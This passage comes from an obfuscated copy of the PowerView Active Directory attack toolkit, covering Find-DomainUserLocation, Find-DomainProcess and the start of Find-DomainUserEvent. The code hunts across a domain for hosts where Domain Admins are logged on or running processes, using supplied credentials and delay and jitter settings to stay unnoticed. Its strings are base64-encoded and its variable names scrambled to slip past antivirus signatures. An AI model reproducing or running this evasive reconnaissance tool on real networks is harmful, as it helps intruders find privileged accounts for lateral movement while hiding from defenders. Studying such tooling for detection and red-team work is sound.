                                    ${/\_____/\_/\/\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                                    ${/\_____/\_/\/\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${/=\/=\_/\_/\/\_/\}
                                    ${/\_____/\_/\/\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/==\_/=\/===\/=}
                                    ${/\_____/\_/\/\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) ${_/===\_/\___/=\/=}
                                    ${/\_____/\_/\/\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) $Null
                                    ${/\_____/\_/\/\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) $Null
                                    if ($CheckAccess) {
                                        ${_/\/===\___/\____} = _/=\/\_/\_/=====\_ -____/=\/=\_/=\/\/ ${__/==\_/=\/===\/=}
                                        ${/\_____/\_/\/\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) ${_/\/===\___/\____}.IsAdmin
                                    }
                                    else {
                                        ${/\_____/\_/\/\__/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
                                    }
                                    ${/\_____/\_/\/\__/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAEwAbwBjAGEAdABpAG8AbgA='))))
                                    ${/\_____/\_/\/\__/}
                                }
                            }
                        }
                    }
                }
            }
            if (${_/=\/=\_/=\/=\/\/=}) {
                __/\/=\/\______/\/
            }
        }
        ${/=\_______/\/\__/} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential
            }
            else {
                ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential -___/==\_/\/=\_/=\_
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainUserLocation] Total number of hosts: $(${_/=\__/=\___/=\/=}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAEQAZQBsAGEAeQA6ACAAJABEAGUAbABhAHkALAAgAEoAaQB0AHQAZQByADoAIAAkAEoAaQB0AHQAZQByAA==')))
            ${_/==\/\/==\/=\/==} = 0
            ${__/\_/\/\/\/\/\_/} = New-Object System.Random
            ForEach (${__/==\_/=\/===\/=} in ${_/=\__/=\___/=\/=}) {
                ${_/==\/\/==\/=\/==} = ${_/==\/\/==\/=\/==} + 1
                sleep -Seconds ${__/\_/\/\/\/\/\_/}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainUserLocation] Enumerating server ${__/\__/\/\_/=====} (${_/==\/\/==\/=\/==} of $(${_/=\__/=\___/=\/=}.Count))"
                icm -ScriptBlock ${____/=\/\_/\/\/\_} -ArgumentList ${__/==\_/=\/===\/=}, ${__/\/=\/=\/==\/==}, ${_____/==\/\___/=\}, $Stealth, ${/=\_______/\/\__/}
                if (${/\_____/=\__/==\_} -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFQAYQByAGcAZQB0ACAAdQBzAGUAcgAgAGYAbwB1AG4AZAAsACAAcgBlAHQAdQByAG4AaQBuAGcAIABlAGEAcgBsAHkA')))
                    return
                }
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFUAcwBpAG4AZwAgAHQAaAByAGUAYQBkAGkAbgBnACAAdwBpAHQAaAAgAHQAaAByAGUAYQBkAHMAOgAgACQAVABoAHIAZQBhAGQAcwA=')))
            Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $(${_/=\__/=\___/=\/=}.Length)"
            ${/====\__/\_/===\/} = @{
                'TargetUsers' = ${__/\/=\/=\/==\/==}
                'CurrentUser' = ${_____/==\/\___/=\}
                'Stealth' = $Stealth
                'TokenHandle' = ${/=\_______/\/\__/}
            }
            _/=\__/=\__/=\/==\ -____/=\/=\_/=\/\/ ${_/=\__/=\___/=\/=} -___/\/=\____/=\/\/ ${____/=\/\_/\/\/\_} -__/\/\/\/\____/\/\ ${/====\__/\_/===\/} -Threads $Threads
        }
    }
    END {
        if (${/=\_______/\/\__/}) {
            __/\/=\/\______/\/ -_/=\/=\_/=\/=\/\/= ${/=\_______/\/\__/}
        }
    }
}
function Find-DomainProcess {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${____/=\/=\_/=\/\/},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ProcessName,
        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',
        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${_/\/\_/==\__/=\/\} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${_/\_____/====\/===} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${_/=\_____/===\/\/=} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${___/\/\/\__/==\/=\} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/=\___/=\/=\/==\/} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\/=\/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${_/=\__/=\___/=\/=} = ${____/=\/=\_/=\/\/}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAUQB1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAA==')))
            ${_/=\__/=\___/=\/=} = _/==\/\/\_______/\ @_/\/\_/==\__/=\/\ | select -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainProcess] TargetComputers length: $(${_/=\__/=\___/=\/=}.Length)"
        if (${_/=\__/=\___/=\/=}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAATgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA==')))]) {
            ${/=\__/\_/\_/\_/==} = @()
            ForEach (${_/\___/\__/\/\/==} in $ProcessName) {
                ${/=\__/\_/\_/\_/==} += ${_/\___/\__/\/\/==}.Split(',')
            }
            if (${/=\__/\_/\_/\_/==} -isnot [System.Array]) {
                ${/=\__/\_/\_/\_/==} = [String[]] @(${/=\__/\_/\_/\_/==})
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) {
            ${__/\/=\/=\/==\/==} = __/\__/\/======\_/ @/=\___/=\/=\/==\/ | select -ExpandProperty samaccountname
        }
        else {
            ${/==\__/==========} = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/==\__/==========}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${/==\__/==========}
            ${__/\/=\/=\/==\/==} = _/=\/\/=====\/\/== @/==\__/========== | select -ExpandProperty MemberName
        }
        ${____/=\/\_/\/\/\_} = {
            Param(${____/=\/=\_/=\/\/}, $ProcessName, ${__/\/=\/=\/==\/==}, $Credential)
            ForEach (${__/==\_/=\/===\/=} in ${____/=\/=\_/=\/\/}) {
                ${__/==\/=\/\/\/=\/} = Test-Connection -Count 1 -Quiet -ComputerName ${__/==\_/=\/===\/=}
                if (${__/==\/=\/\/\/=\/}) {
                    if ($Credential) {
                        ${_/\/==\/\/\_/\/\/} = ___/\__/=\_/\/=\/\ -Credential $Credential -____/=\/=\_/=\/\/ ${__/==\_/=\/===\/=} -ErrorAction SilentlyContinue
                    }
                    else {
                        ${_/\/==\/\/\_/\/\/} = ___/\__/=\_/\/=\/\ -____/=\/=\_/=\/\/ ${__/==\_/=\/===\/=} -ErrorAction SilentlyContinue
                    }
                    ForEach (${_____/\/=\____/=\} in ${_/\/==\/\/\_/\/\/}) {
                        if ($ProcessName) {
                            if ($ProcessName -Contains ${_____/\/=\____/=\}.ProcessName) {
                                ${_____/\/=\____/=\}
                            }
                        }
                        elseif (${__/\/=\/=\/==\/==} -Contains ${_____/\/=\____/=\}.User) {
                            ${_____/\/=\____/=\}
                        }
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainProcess] Total number of hosts: $(${_/=\__/=\___/=\/=}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAARABlAGwAYQB5ADoAIAAkAEQAZQBsAGEAeQAsACAASgBpAHQAdABlAHIAOgAgACQASgBpAHQAdABlAHIA')))
            ${_/==\/\/==\/=\/==} = 0
            ${__/\_/\/\/\/\/\_/} = New-Object System.Random
            ForEach (${__/==\_/=\/===\/=} in ${_/=\__/=\___/=\/=}) {
                ${_/==\/\/==\/=\/==} = ${_/==\/\/==\/=\/==} + 1
                sleep -Seconds ${__/\_/\/\/\/\/\_/}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainProcess] Enumerating server ${__/==\_/=\/===\/=} (${_/==\/\/==\/=\/==} of $(${_/=\__/=\___/=\/=}.count))"
                ${/\_____/=\__/==\_} = icm -ScriptBlock ${____/=\/\_/\/\/\_} -ArgumentList ${__/==\_/=\/===\/=}, ${/=\__/\_/\_/\_/==}, ${__/\/=\/=\/==\/==}, $Credential
                ${/\_____/=\__/==\_}
                if (${/\_____/=\__/==\_} -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAVABhAHIAZwBlAHQAIAB1AHMAZQByACAAZgBvAHUAbgBkACwAIAByAGUAdAB1AHIAbgBpAG4AZwAgAGUAYQByAGwAeQA=')))
                    return
                }
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAVQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwA6ACAAJABUAGgAcgBlAGEAZABzAA==')))
            ${/====\__/\_/===\/} = @{
                'ProcessName' = ${/=\__/\_/\_/\_/==}
                'TargetUsers' = ${__/\/=\/=\/==\/==}
                'Credential' = $Credential
            }
            _/=\__/=\__/=\/==\ -____/=\/=\_/=\/\/ ${_/=\__/=\___/=\/=} -___/\/=\____/=\/\/ ${____/=\/\_/\/\/\_} -__/\/\/\/\____/\/\ ${/====\__/\_/===\/} -Threads $Threads
        }
    }
}
function Find-DomainUserEvent {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/},
        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $Filter,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${__/\/=\__/====\/=\} = [DateTime]::Now.AddDays(-1),
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${__/\____/=\_/\_/=\} = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
